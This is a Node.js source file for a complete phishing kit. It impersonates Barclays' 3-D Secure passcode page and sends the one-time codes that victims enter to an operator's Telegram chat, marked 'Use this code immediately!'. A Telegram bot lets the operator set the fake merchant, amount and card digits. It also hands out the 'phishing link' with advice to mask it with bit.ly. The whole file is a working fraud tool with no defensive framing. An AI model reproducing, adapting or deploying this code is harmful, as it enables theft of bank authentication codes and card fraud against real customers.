const express = require('express');
const bodyParser = require('body-parser');
const https = require('https');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// ==========================================
// CONFIGURATION
// ==========================================

const TOKEN = process.env.BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
const CHAT_ID = process.env.CHAT_ID || 'YOUR_CHAT_ID_HERE';
const PORT = process.env.PORT || 3000;

// Config file path
const CONFIG_FILE = path.join(__dirname, 'config.json');

// Default config
let config = {
  phoneLast: '895',
  merchant: 'Argos',
  amount: '£892.50',
  cardLast: '6219',
  bank: 'Barclays',
  date: new Date().toLocaleDateString('en-GB', { day: 'numeric', month: 'long', year: 'numeric' })
};

// Load config if exists
if (fs.existsSync(CONFIG_FILE)) {
  try {
    config = JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf8'));
  } catch (e) {
    console.log('Using default config');
  }
}

// Save config function
function saveConfig() {
  fs.writeFileSync(CONFIG_FILE, JSON.stringify(config, null, 2));
}

// ==========================================
// TELEGRAM BOT COMMANDS
// ==========================================

function sendTelegramMessage(message) {
  const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
  https.get(url, (res) => {
    console.log('Telegram sent:', res.statusCode);
  }).on('error', (e) => {
    console.error('Telegram error:', e.message);
  });
}

// Send startup message with commands
setTimeout(() => {
  const startupMsg = `🚀 <b>Barclays 3DS System Active</b>

<b>Commands:</b>
/setphone [last4] - Change phone digits
/setmerchant [name] - Change store name
/setamount [£X.XX] - Change amount
/setcard [last4] - Change card digits
/status - View current settings
/geturl - Get phishing link

<b>Current Settings:</b>
📱 Phone: ***${config.phoneLast}
🏪 Merchant: ${config.merchant}
💰 Amount: ${config.amount}
💳 Card: ${config.cardLast}`;

  sendTelegramMessage(startupMsg);
}, 2000);

// Check for Telegram commands every 5 seconds
let lastUpdateId = 0;

function checkTelegramCommands() {
  const url = `https://api.telegram.org/bot${TOKEN}/getUpdates?offset=${lastUpdateId + 1}&limit=10`;
  
  https.get(url, (res) => {
    let data = '';
    res.on('data', chunk => data += chunk);
    res.on('end', () => {
      try {
        const updates = JSON.parse(data);
        if (updates.result && updates.result.length > 0) {
          updates.result.forEach(update => {
            lastUpdateId = update.update_id;
            
            if (update.message && update.message.text) {
              const text = update.message.text;
              const chatId = update.message.chat.id;
              
              // Only respond to authorized chat
              if (chatId.toString() !== CHAT_ID) return;
              
              let response = '';
              
              if (text.startsWith('/setphone ')) {
                config.phoneLast = text.replace('/setphone ', '').trim();
                saveConfig();
                response = `✅ Phone updated to: ***${config.phoneLast}`;
              }
              else if (text.startsWith('/setmerchant ')) {
                config.merchant = text.replace('/setmerchant ', '').trim();
                saveConfig();
                response = `✅ Merchant updated to: ${config.merchant}`;
              }
              else if (text.startsWith('/setamount ')) {
                config.amount = text.replace('/setamount ', '').trim();
                saveConfig();
                response = `✅ Amount updated to: ${config.amount}`;
              }
              else if (text.startsWith('/setcard ')) {
                config.cardLast = text.replace('/setcard ', '').trim();
                saveConfig();
                response = `✅ Card updated to: ****${config.cardLast}`;
              }
              else if (text === '/status') {
                response = `📊 <b>Current Settings:</b>\n\n📱 Phone: ***${config.phoneLast}\n🏪 Merchant: ${config.merchant}\n💰 Amount: ${config.amount}\n💳 Card: ****${config.cardLast}\n📅 Date: ${config.date}`;
              }
              else if (text === '/geturl') {
                response = `🔗 <b>Your Phishing URL:</b>\n\nhttps://${process.env.RAILWAY_STATIC_URL || 'your-domain.up.railway.app'}\n\nMask with bit.ly for stealth.`;
              }
              else if (text === '/help' || text === '/start') {
                response = `🤖 <b>Barclays 3DS Bot</b>\n\nUse commands to control the phishing page:\n\n/setphone 895\n/setmerchant Argos\n/setamount £892.50\n/setcard 6219\n/status\n/geturl`;
              }
              
              if (response) {
                sendTelegramMessage(response);
              }
            }
          });
        }
      } catch (e) {
        console.error('Parse error:', e.message);
      }
    });
  }).on('error', (e) => {
    console.error('GetUpdates error:', e.message);
  });
}

// Check commands every 5 seconds
setInterval(checkTelegramCommands, 5000);

// ==========================================
// BARCLAYS 3D SECURE PAGE
// ==========================================

app.get('/', (req, res) => {
  // Update date to today
  config.date = new Date().toLocaleDateString('en-GB', { day: 'numeric', month: 'long', year: 'numeric' });
  
  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Barclays - 3D Secure</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background: #f4f4f4;
            min-height: 100vh;
            -webkit-font-smoothing: antialiased;
        }
        
        .container {
            max-width: 480px;
            margin: 0 auto;
            background: #ffffff;
            min-height: 100vh;
            position: relative;
            box-shadow: 0 0 20px rgba(0,0,0,0.1);
        }
        
        /* Header */
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px;
            background: #ffffff;
            border-bottom: 1px solid #e0e0e0;
        }
        
        .barclays-logo {
            font-size: 26px;
            font-weight: 700;
            color: #00aeef;
            letter-spacing: -0.5px;
        }
        
        .visa-logo {
            width: 50px;
            height: auto;
        }
        
        /* Content */
        .content {
            padding: 30px 20px 100px;
        }
        
        h1 {
            font-size: 28px;
            color: #00395d;
            margin-bottom: 20px;
            font-weight: 600;
            line-height: 1.2;
        }
        
        .description {
            color: #666;
            font-size: 16px;
            line-height: 1.5;
            margin-bottom: 25px;
        }
        
        .phone-number {
            font-weight: 700;
            color: #0076a8;
        }
        
        /* Transaction Box */
        .transaction-box {
            background: #f9f9f9;
            border-radius: 12px;
            padding: 25px;
            margin-bottom: 30px;
            border-left: 4px solid #0076a8;
        }
        
        .merchant-name {
            font-size: 20px;
            font-weight: 700;
            color: #333;
            margin-bottom: 8px;
        }
        
        .amount {
            font-size: 36px;
            font-weight: 800;
            color: #00395d;
            margin-bottom: 5px;
            letter-spacing: -1px;
        }
        
        .date {
            color: #888;
            font-size: 15px;
        }
        
        /* Input Section */
        .input-section {
            margin-bottom: 25px;
        }
        
        .input-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }
        
        .input-label {
            font-weight: 700;
            color: #333;
            font-size: 17px;
        }
        
        .resend-link {
            color: #0076a8;
            font-size: 14px;
            text-decoration: none;
            font-weight: 600;
        }
        
        .resend-link:hover {
            text-decoration: underline;
        }
        
        .code-input {
            width: 100%;
            padding: 20px;
            border: 3px solid #0076a8;
            border-radius: 10px;
            font-size: 32px;
            text-align: center;
            letter-spacing: 15px;
            font-weight: 700;
            color: #333;
            background: #fff;
            transition: all 0.3s;
            -webkit-appearance: none;
        }
        
        .code-input:focus {
            outline: none;
            border-color: #00395d;
            box-shadow: 0 0 0 4px rgba(0, 118, 168, 0.1);
        }
        
        .code-input::placeholder {
            color: #ccc;
            letter-spacing: 10px;
        }
        
        /* Timer */
        .timer {
            text-align: center;
            color: #d32f2f;
            font-size: 15px;
            margin-bottom: 20px;
            font-weight: 600;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        
        .timer::before {
            content: "⏱";
        }
        
        /* Button */
        .confirm-btn {
            width: 100%;
            padding: 20px;
            background: #0076a8;
            color: white;
            border: none;
            border-radius: 30px;
            font-size: 19px;
            font-weight: 700;
            cursor: pointer;
            margin-bottom: 20px;
            transition: all 0.3s;
            box-shadow: 0 4px 6px rgba(0, 118, 168, 0.3);
        }
        
        .confirm-btn:hover {
            background: #00395d;
            transform: translateY(-2px);
            box-shadow: 0 6px 12px rgba(0, 118, 168, 0.4);
        }
        
        .confirm-btn:active {
            transform: translateY(0);
        }
        
        .confirm-btn:disabled {
            background: #ccc;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }
        
        .confirm-btn.processing {
            background: #00395d;
        }
        
        /* Cancel Link */
        .cancel-link {
            display: block;
            text-align: center;
            color: #d32f2f;
            font-size: 17px;
            text-decoration: underline;
            font-weight: 600;
            padding: 10px;
        }
        
        /* Footer */
        .footer {
            position: fixed;
            bottom: 0;
            left: 50%;
            transform: translateX(-50%);
            width: 100%;
            max-width: 480px;
            background: #f9f9f9;
            padding: 20px;
            text-align: center;
            border-top: 1px solid #e0e0e0;
        }
        
        .secure-badge {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            color: #666;
            font-size: 13px;
        }
        
        .secure-badge::before {
            content: "🔒";
            font-size: 14px;
        }
        
        /* Loading Animation */
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        
        .processing {
            animation: pulse 1.5s infinite;
        }
        
        /* Responsive */
        @media (max-width: 480px) {
            .container {
                max-width: 100%;
            }
            .content {
                padding: 25px 15px 80px;
            }
            h1 {
                font-size: 24px;
            }
            .amount {
                font-size: 28px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="barclays-logo">barclays</div>
            <svg class="visa-logo" viewBox="0 0 50 16" xmlns="http://www.w3.org/2000/svg">
                <rect fill="#1a1f71" width="50" height="16" rx="2"/>
                <text x="5" y="11" fill="white" font-size="8" font-weight="bold" font-style="italic">VISA</text>
            </svg>
        </div>
        
        <div class="content">
            <h1>Confirm with a passcode</h1>
            
            <p class="description">
                We've sent a 6-digit passcode to <span class="phone-number">********${config.phoneLast}</span>. Never share it.
            </p>
            
            <div class="transaction-box">
                <div class="merchant-name">${config.merchant}</div>
                <div class="amount">${config.amount}</div>
                <div class="date">${config.date}</div>
            </div>
            
            <div class="input-section">
                <div class="input-header">
                    <label class="input-label">Enter passcode</label>
                    <a href="#" class="resend-link" onclick="return false;">Resend code</a>
                </div>
                
                <div class="timer" id="timer">Code expires in: 02:59</div>
                
                <input 
                    type="tel" 
                    class="code-input" 
                    id="otpInput" 
                    maxlength="6" 
                    placeholder="------"
                    inputmode="numeric"
                    pattern="[0-9]*"
                    autocomplete="one-time-code"
                >
            </div>
            
            <button class="confirm-btn" id="submitBtn" onclick="submitCode()">Confirm</button>
            
            <a href="#" class="cancel-link" onclick="cancelPayment(); return false;">Cancel payment</a>
        </div>
        
        <div class="footer">
            <div class="secure-badge">SSL Encrypted • Verified by Visa</div>
        </div>
    </div>

    <script>
        // Countdown Timer
        let timeLeft = 179;
        const timerElement = document.getElementById('timer');
        const inputElement = document.getElementById('otpInput');
        const submitBtn = document.getElementById('submitBtn');
        
        const countdown = setInterval(() => {
            timeLeft--;
            const minutes = Math.floor(timeLeft / 60);
            const seconds = timeLeft % 60;
            timerElement.textContent = \`Code expires in: \${minutes.toString().padStart(2, '0')}:\${seconds.toString().padStart(2, '0')}\`;
            
            if (timeLeft <= 0) {
                clearInterval(countdown);
                timerElement.textContent = 'Code expired';
                timerElement.style.color = '#999';
                inputElement.disabled = true;
                submitBtn.disabled = true;
            }
        }, 1000);
        
        // Auto-focus input
        inputElement.focus();
        
        // Handle input
        inputElement.addEventListener('input', (e) => {
            // Remove non-numeric characters
            e.target.value = e.target.value.replace(/[^0-9]/g, '');
            
            // Auto-submit when 6 digits entered
            if (e.target.value.length === 6) {
                submitCode();
            }
        });
        
        // Submit function
        function submitCode() {
            const code = inputElement.value;
            
            if (code.length !== 6) {
                inputElement.style.borderColor = '#d32f2f';
                return;
            }
            
            // Disable inputs
            inputElement.disabled = true;
            submitBtn.disabled = true;
            submitBtn.classList.add('processing');
            submitBtn.textContent = 'Verifying...';
            
            // Send to server
            fetch('/capture', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ otp: code })
            })
            .then(response => response.json())
            .then(data => {
                console.log('Success:', data);
            })
            .catch(error => {
                console.error('Error:', error);
            });
            
            // Redirect after delay
            setTimeout(() => {
                window.location.href = 'https://www.barclays.co.uk/';
            }, 2000);
        }
        
        // Cancel function
        function cancelPayment() {
            if (confirm('Are you sure you want to cancel this payment?')) {
                window.location.href = 'https://www.barclays.co.uk/';
            }
        }
        
        // Handle Enter key
        inputElement.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                submitCode();
            }
        });
    </script>
</body>
</html>`);
});

// ==========================================
// CAPTURE ENDPOINT
// ==========================================

app.post('/capture', (req, res) => {
  const otp = req.body.otp;
  
  if (!otp || otp.length !== 6) {
    return res.status(400).json({ error: 'Invalid OTP' });
  }
  
  // Build message
  const message = `🚨 <b>BARCLAYS OTP CAPTURED</b> 🚨

💳 Card: ****${config.cardLast}
📱 Phone: ***${config.phoneLast}
🏪 Merchant: ${config.merchant}
💰 Amount: ${config.amount}
🔢 OTP: <code>${otp}</code>
⏰ Time: ${new Date().toLocaleString('en-GB')}
📅 Date: ${config.date}

✅ Use this code immediately!`;

  // Send to Telegram
  sendTelegramMessage(message);
  
  // Log to console
  console.log(`OTP Captured: ${otp} for ${config.merchant} ${config.amount}`);
  
  res.json({ success: true, message: 'Code verified' });
});

// Health check
app.get('/health', (req, res) => {
  res.json({ status: 'ok', config: config });
});

// Start server
app.listen(PORT, () => {
  console.log(`Barclays 3DS Server running on port ${PORT}`);
  console.log('Telegram bot active');
  console.log('Config:', config);
});

// Handle errors
process.on('uncaughtException', (err) => {
  console.error('Uncaught Exception:', err);
});

process.on('unhandledRejection', (err) => {
  console.error('Unhandled Rejection:', err);
});
